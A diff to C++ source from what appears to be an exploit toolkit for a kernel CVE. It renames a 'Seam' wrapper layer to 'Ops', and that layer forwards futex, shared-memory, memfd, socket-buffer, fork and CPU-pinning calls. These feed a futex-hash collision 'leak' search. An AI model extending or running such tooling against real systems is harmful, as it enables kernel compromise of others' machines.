@@ -8,52 +8,52 @@
 
 #include "backend/cve_2026_43499/leak/collision_buckets.hpp"
 #include "backend/cve_2026_43499/leak/futex_hash.hpp"
-#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
-#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
-#include "backend/cve_2026_43499/leak/snitch_seam.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops_linux.hpp"
+#include "backend/cve_2026_43499/memory/heap_ops_linux.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops.hpp"
 #include "backend/cve_2026_43499/leak/futex_hash.hpp"
 
 namespace ghostlock::backend::cve_2026_43499::steps {
     namespace {
-        /** 两个 seam 合起来用：搜索自己的映射/线程走 snitch seam，fork/memfd 等走 heap seam
-         *  （与设备探针里那份 DeviceSeam 同一形状）。 */
-        struct DeviceSeam final {
-            static leak::MapResult map_shared(std::size_t bytes) noexcept { return leak::LinuxSnitchSeam::map_shared(bytes); }
-            static memory::SeamResult unmap(void *address, std::size_t bytes) noexcept { return leak::LinuxSnitchSeam::unmap(address, bytes); }
-            static memory::SeamResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
-                return leak::LinuxSnitchSeam::futex_wait_private(word, expected);
+        /** 两个 landing 合起来用：搜索自己的映射/线程走 snitch landing，fork/memfd 等走 heap landing
+         *  （与设备探针里那份 DeviceOps 同一形状）。 */
+        struct DeviceOps final {
+            static leak::MapResult map_shared(std::size_t bytes) noexcept { return leak::LinuxSnitchOps::map_shared(bytes); }
+            static memory::OpsResult unmap(void *address, std::size_t bytes) noexcept { return leak::LinuxSnitchOps::unmap(address, bytes); }
+            static memory::OpsResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
+                return leak::LinuxSnitchOps::futex_wait_private(word, expected);
             }
-            static memory::SeamResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
+            static memory::OpsResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
                                                               std::int64_t timeout_us) noexcept {
-                return leak::LinuxSnitchSeam::futex_wait_private_until(word, expected, timeout_us);
+                return leak::LinuxSnitchOps::futex_wait_private_until(word, expected, timeout_us);
             }
-            static memory::SeamResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
-                return leak::LinuxSnitchSeam::futex_wake_private(word, waiters);
+            static memory::OpsResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
+                return leak::LinuxSnitchOps::futex_wake_private(word, waiters);
             }
             static leak::ThreadResult start_thread(leak::ThreadEntry entry, void *argument) noexcept {
-                return leak::LinuxSnitchSeam::start_thread(entry, argument);
+                return leak::LinuxSnitchOps::start_thread(entry, argument);
             }
-            static memory::SeamResult join_thread(unsigned long handle) noexcept { return leak::LinuxSnitchSeam::join_thread(handle); }
-            static memory::SeamResult page_size() noexcept { return memory::LinuxHeapSeam::page_size(); }
-            static memory::SeamResult open_memfd(std::uint64_t pid) noexcept { return memory::LinuxHeapSeam::open_memfd(pid); }
-            static memory::SeamResult close_fd(std::int32_t fd) noexcept { return memory::LinuxHeapSeam::close_fd(fd); }
-            static memory::SeamResult socket_pair(std::int32_t *out) noexcept { return memory::LinuxHeapSeam::socket_pair(out); }
-            static memory::SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
-                return memory::LinuxHeapSeam::set_socket_buffer(fd, bytes);
+            static memory::OpsResult join_thread(unsigned long handle) noexcept { return leak::LinuxSnitchOps::join_thread(handle); }
+            static memory::OpsResult page_size() noexcept { return memory::LinuxHeapOps::page_size(); }
+            static memory::OpsResult open_memfd(std::uint64_t pid) noexcept { return memory::LinuxHeapOps::open_memfd(pid); }
+            static memory::OpsResult close_fd(std::int32_t fd) noexcept { return memory::LinuxHeapOps::close_fd(fd); }
+            static memory::OpsResult socket_pair(std::int32_t *out) noexcept { return memory::LinuxHeapOps::socket_pair(out); }
+            static memory::OpsResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
+                return memory::LinuxHeapOps::set_socket_buffer(fd, bytes);
             }
-            static memory::SeamResult set_nonblocking(std::int32_t fd) noexcept { return memory::LinuxHeapSeam::set_nonblocking(fd); }
-            static memory::SeamResult send_bytes(std::int32_t fd, const void *data,
+            static memory::OpsResult set_nonblocking(std::int32_t fd) noexcept { return memory::LinuxHeapOps::set_nonblocking(fd); }
+            static memory::OpsResult send_bytes(std::int32_t fd, const void *data,
                                                  std::size_t bytes) noexcept {
-                return memory::LinuxHeapSeam::send_bytes(fd, data, bytes);
+                return memory::LinuxHeapOps::send_bytes(fd, data, bytes);
             }
-            static memory::SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
-                return memory::LinuxHeapSeam::send_buffer(fd, bytes);
+            static memory::OpsResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
+                return memory::LinuxHeapOps::send_buffer(fd, bytes);
             }
-            static memory::SeamResult fork_child() noexcept { return memory::LinuxHeapSeam::fork_child(); }
-            static memory::SeamResult stop_child(std::uint64_t pid) noexcept { return memory::LinuxHeapSeam::stop_child(pid); }
-            static memory::SeamResult yield_now() noexcept { return memory::LinuxHeapSeam::yield_now(); }
-            static memory::SeamResult pin_to_processor(std::int32_t cpu) noexcept { return memory::LinuxHeapSeam::pin_to_processor(cpu); }
-            static void exit_child() noexcept { memory::LinuxHeapSeam::exit_child(); }
+            static memory::OpsResult fork_child() noexcept { return memory::LinuxHeapOps::fork_child(); }
+            static memory::OpsResult stop_child(std::uint64_t pid) noexcept { return memory::LinuxHeapOps::stop_child(pid); }
+            static memory::OpsResult yield_now() noexcept { return memory::LinuxHeapOps::yield_now(); }
+            static memory::OpsResult pin_to_processor(std::int32_t cpu) noexcept { return memory::LinuxHeapOps::pin_to_processor(cpu); }
+            static void exit_child() noexcept { memory::LinuxHeapOps::exit_child(); }
         };
 
 
@@ -78,7 +78,7 @@ namespace ghostlock::backend::cve_2026_43499::steps {
 
         /* The words live in a region this process maps, one per collision: they are both the words
          *  the cohort hammers and the addresses the rule compares. */
-        const auto words_region = DeviceSeam::map_shared(kWordsBytes);
+        const auto words_region = DeviceOps::map_shared(kWordsBytes);
         if (words_region.address == nullptr) {
             *refusal = kWordsUnmapped;
             return false;
@@ -108,7 +108,7 @@ namespace ghostlock::backend::cve_2026_43499::steps {
             return false;
         }
 
-        const leak::RunOutcome outcome = leak::run_snitch_search<DeviceSeam>(
+        const leak::RunOutcome outcome = leak::run_snitch_search<DeviceOps>(
                 request.setup, request.region, request.patience, request.counter_offset, word_ptrs,
                 count, request.strides, request.range, request.sweep_tags, buckets, addresses, count);
         out.verdict = leak::run_verdict_name(outcome.status);
